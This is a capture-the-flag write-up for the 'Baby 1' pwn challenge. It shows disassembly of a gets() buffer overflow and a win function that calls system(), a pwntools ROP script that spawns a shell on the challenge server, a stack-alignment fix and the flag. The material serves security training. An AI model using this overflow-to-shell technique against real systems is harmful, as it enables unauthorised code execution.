# Baby 1

Categories: pwn baby pwned! <br/>
Description: When Swordfish came out, these were considered some state of the art techniques. Let's see if you have what it takes. <br/>
File: [baby1](baby1)

## Solution

The binary contains a `win` function that looks like this:

```
/ (fcn) sym.win 27
|   sym.win (char *arg1);
|           ; var char *string @ rbp-0x8
|           ; arg char *arg1 @ rdi
|           0x00400698      55             push rbp
|           0x00400699      4889e5         mov rbp, rsp
|           0x0040069c      4883ec10       sub rsp, 0x10
|           0x004006a0      48897df8       mov qword [string], rdi     ; arg1
|           0x004006a4      488b45f8       mov rax, qword [string]
|           0x004006a8      4889c7         mov rdi, rax                ; const char *string
|           0x004006ab      e8b0feffff     call sym.imp.system         ; int system(const char *string)
|           0x004006b0      90             nop
|           0x004006b1      c9             leave
\           0x004006b2      c3             ret
```

Moreover there is a `gets` call at the end of `main` which gives us a simple buffer overflow.

```
|           0x00400710      488d45f0       lea rax, [s]
|           0x00400714      4889c7         mov rdi, rax                ; char *s
|           0x00400717      b800000000     mov eax, 0
|           0x0040071c      e85ffeffff     call sym.imp.gets           ; char *gets(char *s)
|           0x00400721      b800000000     mov eax, 0
|           0x00400726      c9             leave
\           0x00400727      c3             ret
```

The following script worked locally but not on the remote target:

```python
from pwn import *

isRemote = args['REMOTE']

binary = './baby1'

context.binary = binary
elf = ELF(binary)

r = ROP(elf)
r.win(next(elf.search('/bin/sh')))

p = remote('baby-01.pwn.beer', 10001) if isRemote else elf.process()

print(p.recvuntil('input: '))
p.sendline('A' * 24 + str(r))
p.interactive()
```

The reason for this was that Ubuntu uses [Streaming SIMD
Extensions](https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions) which require the stack to be aligned. Adding a
`ret` gadget solved the problem:

```python
r = ROP(elf)
r.raw(r.find_gadget(['ret']).address) # align the stack
r.win(next(elf.search('/bin/sh')))
```

Calling the `banner` function would have also fixed the alignment problem.
The flag was: `sctf{1.p0p_r3GIs73rS_2.pOp_5H3lL_3.????_4.pr0FiT}`

